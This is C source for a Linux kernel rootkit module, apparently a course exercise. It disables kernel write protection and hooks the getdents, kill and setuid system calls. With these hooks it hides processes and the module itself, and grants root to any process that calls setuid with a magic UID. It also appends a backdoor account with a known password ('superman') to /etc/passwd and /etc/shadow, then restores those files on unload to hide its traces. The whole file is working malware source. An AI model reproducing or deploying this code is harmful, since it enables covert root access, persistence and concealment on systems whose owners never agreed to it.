#include <linux/module.h>      // for all modules
#include <linux/moduleparam.h> 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <linux/file.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <asm/unistd.h>        // for system call constants
#include <asm/current.h>       // process information
#include <asm/page.h>
#include <asm/cacheflush.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

#define BUFFLEN 32
#define PF_INVISIBLE 0x10000000
#define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"

#define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman

#define PASSWD "/etc/passwd"
#define PASSWD_COPY "/tmp/passwd"
#define SHADOW "/etc/shadow"
#define SHADOW_COPY "/tmp/shadow"
#define MAGIC_NUMBER 12345
#define	SIGSHPROC 62
#define SIGSHMOD 63

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};


unsigned long* GetSysTable(void){
	unsigned long *sys_call_table;
	unsigned long int i = (unsigned long int)sys_close;
	while(i < ULONG_MAX) {
		sys_call_table = (unsigned long *)i;
		if(*(sys_call_table + __NR_close) == (unsigned long)sys_close){
			return sys_call_table;
		}
        i = i + sizeof(void *);
	}
	return (unsigned long*)NULL;
}

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
//asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
/* Setuid syscall hook */
//asmlinkage int (*origin_setuid) (uid_t uid);

void GetRoot(void){
    /* Create new cred struct */
	struct cred *nc;
	nc = prepare_creds();
	if(nc == NULL) return;
#if 1
	nc->uid.val = 0;
	nc->gid.val = 0;
	nc->euid.val = 0;
	nc->egid.val = 0;
	nc->suid.val = 0;
	nc->sgid.val = 0;
	nc->fsuid.val = 0;
	nc->fsgid.val = 0;
#endif
	commit_creds(nc);
}
/*
struct task_struct* FindTask(pid_t pid){
	struct task_struct* curp = current;
	for_each_process(curp){
		if(curp->pid == pid) return curp;
	}
	return NULL;
}
*/
int isInvisible(pid_t pid){
	struct task_struct* task;
	if(!pid) return 0;
    struct task_struct* curp = current;
    for_each_process(curp){
        if(curp->pid == pid) break;
    }
	if(!curp) return 0;
	if(curp->flags & PF_INVISIBLE) return 1;
	return 0;
}

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  /* //hide the sneaky process */
  	struct linux_dirent* d;
	char* name;
	char d_type;
  	int bpos = 0;
	int sneaky_len = 0;
	int* des;
  	int read = original_getdents(fd,dirp,count); 
  	if(read == 0){ 
		printk("end of directory\n");
  		return read;
  	}
  	if(read == -1){
  		printk("getdents failed\n");
  		return read;
  	}

  	while(bpos<read){
  		d = (struct linux_dirent *)((char*)dirp + bpos);
  		name = d->d_name;
  		d_type = *((char*)dirp+bpos+d->d_reclen-1);
  		if(isInvisible(simple_strtoul(d->d_name, NULL, 10))){
  			printk("this is the sneaky_process\n");
  			sneaky_len = d->d_reclen;
  			//printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos); 
  			des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len);
  	     	//printk("des = %d\n",des);
  			read -= sneaky_len;
  		} 
  		else{
 			bpos += d->d_reclen; 
  			printk("d->d_reclen = %d, bpos = %d\n",d->d_reclen,bpos); 
  		} 
 	}
  	return read;
  	return original_getdents(fd, dirp, count);
}
/*
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
  
  char* get_fp = (char*)__get_free_page(GFP_TEMPORARY);
  struct file* file_get = fget(fd);
  char* cur_path = d_path(&file_get->f_path, get_fp, PAGE_SIZE);
  
  ssize_t read = original_read(fd,buf,count);
  char* temp = strstr((char*)buf,"sneaky_mod");
  if(temp != NULL){
    char* newlineptr = strchr(temp,'\n');
    if(newlineptr != NULL){
      if(strstr(cur_path,"/proc")!=NULL){
        read = read - (newlineptr - temp + 1);
        memmove(temp,newlineptr+1,strlen(newlineptr+1)+1);
        return read;
      }
    }
  }
  return read;
}
*/

static struct list_head* module_head;
static short mhide = 0;

void ShowModule(void){
	list_add(&THIS_MODULE->list, module_head);
	mhide = 0;
}

void HideModule(void){
	module_head = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	mhide = 1;
}

asmlinkage int (*original_kill)(pid_t pid, int sig);
asmlinkage int sneaky_kill(pid_t pid, int sig){
	struct task_struct* curp = current;
	if(sig == SIGSHPROC){ 
		for_each_process(curp){
        	if(curp->pid == pid){
				curp->flags = curp->flags ^ PF_INVISIBLE;
				break;
			}
    	}
		return -ESRCH;
	}
	else if(sig == SIGSHMOD){
		if(mhide) ShowModule();
		else HideModule();
	}
	else{
		return original_kill(pid, sig);
	}
	return 0;
}

/* Setuid syscall hook */
asmlinkage int (*origin_setuid) (uid_t uid);
asmlinkage int secure_setuid(uid_t uid)
{
  if (uid == MAGIC_NUMBER)
    {
      /* Create new cred struct */
      struct cred *new_cred;
      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
      printk(KERN_WARNING "[!] Attempting UID change!");
      /* Prepares new set of credentials for task_struct of current process */
      new_cred = prepare_creds();
      /* Set uid of new cred struct to 0 */
      new_cred->uid = GLOBAL_ROOT_UID;
      new_cred->gid = GLOBAL_ROOT_GID;
      new_cred->suid = GLOBAL_ROOT_UID;
      new_cred->sgid = GLOBAL_ROOT_GID;
      new_cred->euid = GLOBAL_ROOT_UID;
      new_cred->egid = GLOBAL_ROOT_GID;
      new_cred->fsuid = GLOBAL_ROOT_UID;
      new_cred->fsgid = GLOBAL_ROOT_GID;
      /* Commit cred to task_struct of process */
      commit_creds(new_cred);
      printk(KERN_WARNING "[!] Changes Complete!");
      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);

    }
  /* Call original setuid syscall */
  return origin_setuid(uid);
}

int cp_passwd(char* path, char* copypath){
  struct file *fin;
  struct file *fout;
  loff_t begin = 0;
  //loff_t end = 0;
  int filesize = 0;
  int ret = 0;
  struct kstat stat;
  mm_segment_t old_fs;
  
  old_fs = get_fs();
  set_fs(get_ds());
  fin = filp_open(path, O_RDWR, 0644);
  set_fs(old_fs);
  if(IS_ERR(fin)){
      printk("Cannot open %s in cp function\n", path);
      return 1;
  }

  fout = filp_open(copypath,O_RDWR|O_CREAT, 0644);
  if(IS_ERR(fout)){
    printk("Cannot open %s in cp function\n", copypath);
    return 1;
  }
  old_fs = get_fs();  
  set_fs(get_ds());
  ret = vfs_stat(path, &stat);
  filesize = stat.size;
  printk("filesize = %d\n", filesize);
  char buf[filesize];
  //ret = vfs_llseek(fin, begin, SEEK_SET);
  //ret = vfs_llseek(fin, end, SEEK_END);
  set_fs(old_fs);
  if(ret < 0){
	  printk("wrong end offset\n");
	  return 1;
  }
  old_fs = get_fs();
  set_fs(get_ds());
  filesize = vfs_read(fin, buf, filesize, &begin);
  set_fs(old_fs);
  printk("filesize = %d\n", filesize);
  if(filesize < 0){
    printk("wrong file size\n");
    return 1;
  }
  //printk("filesize = %d, end = %d\n", filesize, end);
  old_fs = get_fs();
  set_fs(get_ds());
  begin = 0;
  ret = vfs_write(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(ret < 0){
  	printk("file backup failed\n");
	  return 1;
  }
  return 0;
}

void add_backdoor(char * pathname)
{
  char * BACKDOOR;
  loff_t offset = 0;
  int ret = 0;
  mm_segment_t old_fs;
  struct file *file;

  printk(KERN_ALERT "hello add backdoor\n");
  if(strcmp(pathname, PASSWD)==0){
    BACKDOOR = BACKDOOR_PASSWD;
    cp_passwd(pathname, PASSWD_COPY);
  }
 	if(strcmp(pathname, SHADOW)==0){
    BACKDOOR = BACKDOOR_SHADOW;
    cp_passwd(pathname, SHADOW_COPY);
 	}
 	old_fs = get_fs();
  set_fs(get_ds());
	file = filp_open(pathname, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(file)){
    printk("file open err\n");
    return;
  }
	set_fs(get_ds());
  offset = vfs_llseek(file, offset, SEEK_END);
  set_fs(old_fs);
	if(offset < 0){
		printk("wrong offset\n");
		return;
	}
  set_fs(get_ds());
	file = filp_open(pathname, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(file)){
    printk("file open err\n");
    return;
  }
	old_fs = get_fs();
  set_fs(get_ds());
  ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
  set_fs(old_fs);
  if(ret<0){
    printk("backdoor write failed\n");
    return;
  }
}

int restore_passwd(char* copypath, char* path){
  struct file *fin;
  struct file *fout;
  loff_t begin = 0;
  //loff_t end = 0;
  mm_segment_t old_fs;
  int filesize = 0;
  int copyfilesize = 0;
  int ret = 0;
  struct kstat stat;
  struct kstat copystat;

  old_fs = get_fs();
  set_fs(get_ds());
  fin = filp_open(copypath, O_RDWR, 0);
  set_fs(old_fs);
  if(IS_ERR(fin)){
      printk("Cannot open %s in restore function\n", path);
      return 1;
  }

  fout = filp_open(path,O_RDWR, 0);
  if(IS_ERR(fout)){
    printk("Cannot open %s in restore function\n", copypath);
    return 1;
  }

  old_fs = get_fs();  
  set_fs(get_ds());
  ret = vfs_stat(path, &stat);
  ret = vfs_stat(copypath, &copystat);
  filesize = stat.size;
  copyfilesize = copystat.size;
  //printk("filesize = %d\n", filesize);
  char buf[filesize]; 
  char copybuf[copyfilesize];
  old_fs = get_fs();
  set_fs(get_ds());
  copyfilesize = vfs_read(fin, copybuf, copyfilesize, &begin);
  begin = 0;
  filesize = vfs_read(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(copyfilesize < 0){
    printk("wrong file size\n");
    return 1;
  }
  int i = copyfilesize;
  while(i < filesize){
    buf[i] = ' ';
    i++;
  }

  printk("filesize:%d, filecopysize:%d\n", filesize, copyfilesize);
  printk("buf is %s\n", buf);
  old_fs = get_fs();
  set_fs(get_ds());
  //begin = vfs_llseek(fout, begin, SEEK_SET);
  begin = 0;
  ret = vfs_write(fout, buf, filesize, &begin);
  set_fs(old_fs);
  if(ret < 0){
  	printk("file restore failed\n");
	return 1;
  }
  return 0;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  //struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
  /*
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  */
  add_backdoor(PASSWD);
  add_backdoor(SHADOW);
  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  //origin_setuid = (void*)*(sys_call_table + __NR_setuid);
  //*(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid;
  module_head = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  mhide = 1;
 
  //getdents
  original_getdents = (void*)*(sys_call_table + __NR_getdents);  
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
  //kill
  original_kill = (void*)*(sys_call_table + __NR_kill);  
  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
  //setuid
  origin_setuid = (void*)*(sys_call_table + __NR_setuid);
  *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
  /*
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
  */
  cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  //struct page *page_ptr;
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
  /*
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  */
  //restore passwd and shadow file
  restore_passwd(PASSWD_COPY, PASSWD);
  restore_passwd(SHADOW_COPY, SHADOW);
  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
  //*(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
  /*
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
  */
  cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

